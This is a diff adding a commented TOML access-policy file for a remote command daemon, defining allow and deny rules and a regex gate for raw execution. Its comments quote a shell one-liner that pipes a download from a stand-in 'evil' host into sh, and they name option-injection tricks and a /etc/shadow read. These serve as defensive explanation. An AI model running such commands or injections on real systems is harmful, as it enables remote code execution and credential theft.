@@ -1,0 +1,181 @@
+# Relay — Node Policy file
+#
+# SECURITY INVARIANTS (ADR-0002):
+#   - Node-rooted and remotely-immutable: this file is edited by a human on the
+#     Node (or by config management). The Relay may query it but may NEVER modify
+#     it over the wire.
+#   - Root-owned: this file must be owned by root (uid 0) or the relay-daemon's
+#     effective uid.
+#   - Not group- or world-writable: if the group- or world-write bit is set the
+#     daemon refuses to load this file and fails closed (no Operation may run).
+#   - Deny-by-default: any Operation or Raw Exec command not covered by an allow
+#     rule is denied.
+#   - Deny-beats-allow: if both a deny and an allow rule match, the deny wins.
+#
+# VACUOUS-DENY SEMANTICS:
+#   A [[deny]] rule lists positions to constrain. If an invocation has FEWER
+#   arguments than the rule lists, the unlisted/trailing positions are vacuously
+#   satisfied (i.e. the deny still fires). This is the more-restrictive reading:
+#   a deny written for N args blocks shorter invocations too, so callers cannot
+#   sneak under a deny by omitting trailing arguments.
+#
+# ARGUMENT POSITIONS:
+#   `allowed_args[i]` / `args[i]` correspond to argv[i] (0-indexed after the
+#   operation name). The special value "*" in an allow rule matches any value at
+#   that position (wildcard). Deny rules do not support wildcards; list each
+#   denied value explicitly.
+#
+# FILE PLACEMENT (example):
+#   /etc/relay-daemon/policy.toml   (chmod 600 or 640, owned by root)
+
+# ---------------------------------------------------------------------------
+# [[operation]] — per-Operation allow rules
+#
+# Each [[operation]] block names one Operation and its allowed argument sets.
+#
+#   name         — the Operation type name as dispatched by the Relay.
+#   allowed_args — list of positional allowed-value sets.
+#                  allowed_args[i] = the set of values permitted at position i.
+#                  An empty outer list (allowed_args = []) means the Operation
+#                  requires zero arguments ("no-arg allow").
+#                  "*" at any inner position matches any value (wildcard).
+# ---------------------------------------------------------------------------
+
+# Allow `service.restart` only for nginx and php-fpm.
+# Attempts to restart any other service (e.g. sshd) are denied.
+[[operation]]
+name = "service.restart"
+allowed_args = [["nginx", "php-fpm"]]
+
+# Allow `system.facts` with no arguments.
+[[operation]]
+name = "system.facts"
+allowed_args = []
+
+# Allow `file.read` for any path (wildcard). The [[deny]] rule below for
+# /etc/shadow overrides this allow for that specific path (deny-beats-allow).
+[[operation]]
+name = "file.read"
+allowed_args = [["*"]]
+
+# Allow `pkg.install` only for nginx and curl, any version ("*" wildcard at
+# position 1 — the daemon sends "" when no version is requested, which "*"
+# also matches). Attempts to install any other package (e.g. netcat) are
+# denied. Package installs are slow: the daemon hard-caps at 300s
+# (MAX_TIMEOUT); Policy-configurable per-Operation timeouts are a v0.0.4 item.
+[[operation]]
+name = "pkg.install"
+allowed_args = [["nginx", "curl"], ["*"]]
+
+# ---------------------------------------------------------------------------
+# [[deny]] — explicit deny rules (deny-beats-allow)
+#
+# Each [[deny]] block names one Operation and the argument values that are
+# denied, regardless of any overlapping allow rule.
+#
+#   name — the Operation type name.
+#   args — positional denied-value sets; same indexing as allowed_args.
+#           An empty outer list (args = []) blocks the Operation entirely,
+#           regardless of arguments.
+# ---------------------------------------------------------------------------
+
+# Deny `file.read /etc/shadow` even though [[operation]] file.read allows "*".
+# Path denies are matched in CANONICAL FORM (ADR-0018): a non-canonical spelling
+# of the same file (/etc/../etc/shadow, //etc/shadow, /etc/shadow/, ...) is
+# itself denied, and the daemon re-checks the RESOLVED target it actually opens,
+# so a symlink or /proc/self/root/... alias to /etc/shadow is denied too. Write
+# the deny in canonical form, as below.
+[[deny]]
+name = "file.read"
+args = [["/etc/shadow"]]
+
+# ---------------------------------------------------------------------------
+# [raw_exec] — Raw Exec regex gate (ADR-0001)
+#
+# Raw Exec is the only path for arbitrary commands and is gated by this
+# regex list. The daemon joins argv with a single space and tests the result.
+#
+#   allow — list of RE2-compatible regexes; the joined command must match at
+#            least one IN FULL to be considered. The daemon enforces the
+#            whole-command match itself, as if each pattern were written
+#            ^(?:...)$, so anchoring is no longer a recommendation — it is
+#            what the pattern already does either way. `relay-daemon policy
+#            check` warns on an allow pattern not written ^...$, because its
+#            meaning changed in this release: it used to match as a substring
+#            anywhere in the command (ADR-0019, amended 2026-09-16).
+#   deny  — list of RE2-compatible regexes tested against THREE forms: the
+#            joined command, each individual argv element, AND each CANONICAL
+#            element — the joined command re-split on whitespace (ADR-0019).
+#            Any match → deny, even if an allow regex also matched
+#            (deny-beats-allow). The deny message names which of the three
+#            forms matched and the text it matched, since a canonical element
+#            need not appear literally in the argv that was sent. Deny
+#            semantics are otherwise unchanged by this release: a merged or
+#            tab-separated spelling of a denied token is still caught by the
+#            canonical pass, and the deny pass still runs before the
+#            whitespace guard below, so its attribution is kept.
+#
+# Writing a deny (ADR-0019): the canonical pass is what makes an element-
+# anchored deny hold. `^--force$` fires whether the caller sends the token on
+# its own or merged into a neighbouring element ("--force x", "--force\tx",
+# "  --force  "), because canonicalization collapses caller-chosen element
+# boundaries onto one normal form. Write the deny against the TOKEN as it
+# appears in the command; do not write it against a merged spelling
+# (`^--force x$`), which matches only that one raw element.
+#
+# No argv element may contain whitespace (Unicode: space, tab, CR, LF, NBSP,
+# ...). Such a command is refused before any allow pattern runs, and the
+# reason names the element's index. An empty argv[0] is refused; an empty
+# later argument is allowed. Joining is therefore lossless: the command the
+# allow pattern sees is exactly the argv that runs. Consequences for
+# operators: Raw Exec cannot pass an argument containing whitespace (a commit
+# message, a path with a space, a quoted search term), and cannot run a
+# program whose own path contains a space. Such a command needs a Template
+# Operation (ADR-0021), whose slots are typed and quoted by its author. For a
+# spaced program path, a space-free symlink also works. The guard tests for
+# whitespace only, not shell syntax: shell metacharacters and ${IFS} are not
+# whitespace, so a script written without whitespace still passes it, e.g.
+# ["/bin/sh","-c","id;curl${IFS}evil|sh"], and the shell the allow chose
+# expands ${IFS} back into a separator once it runs.
+#
+# Standing guidance: a deny list is a backstop, never the primary control.
+# The same rule covers wrapper interpreters (env, xargs, nice, timeout, sudo,
+# nohup, setsid, ...) and script interpreters (sh -c, bash -c, python -c,
+# perl -e, ...): first, promote interpreter-shaped work to a Template
+# Operation (ADR-0021), whose structure is fixed by its author and whose
+# slot values are passed as positional parameters — the same rule holds
+# inside a Template: its interpreted text (the -c/-e script, the program to
+# run) must be written literally in the template body, never filled by a
+# slot; a slot may fill only a data position, never the script or the program
+# to run. Only where Raw Exec is unavoidable, write the WHOLE command as a
+# literal, so the script text is fixed by you and not by the caller. Never put a trailing
+# .* or an open character class on an argument the program interprets as
+# code or as a path to run, and never a class that lets a caller-supplied
+# argument begin with "-" (option injection: tar --to-command=, rsync -e,
+# git -c core.sshCommand=, systemctl -H...) — a trailing .* such as
+# ^/usr/bin/env .*$ or ^/bin/sh -c .*$ still re-dispatches to anything, and
+# even ^/bin/sh -c [A-Za-z0-9/._-]+$ still runs any program or executable
+# file the caller names. A "literal" allow must itself escape every regex
+# metacharacter in the command it names, or it is not literal:
+# ^/bin/sh -c id|sh$ compiles to \A(?:^/bin/sh -c id|sh$)\z, an alternation
+# that admits only /bin/sh -c id or a bare ["sh"], never the command it
+# appears to name; escaped as ^/bin/sh -c id\|sh$, it is literal — written
+# as a TOML string, that escape is \\| in a basic (double-quoted) allow
+# entry and \| in a literal (single-quoted) one.
+#
+# No allow regex → all Raw Exec commands denied (deny-by-default).
+# ---------------------------------------------------------------------------
+[raw_exec]
+# Allow `systemctl status|restart <unit>` where the unit name is alphanumeric
+# (plus @, ., _, -). Written ^...$ so it reads as what it matches; the daemon
+# matches the whole command either way.
+allow = [
+    "^/usr/bin/systemctl (status|restart) [A-Za-z0-9@._-]+$",
+]
+
+# Deny --force and the word "rm" anywhere in the command (joined, raw element,
+# or canonical element), even if an allow regex matched.
+deny = [
+    "--force",
+    "\\brm\\b",
+]
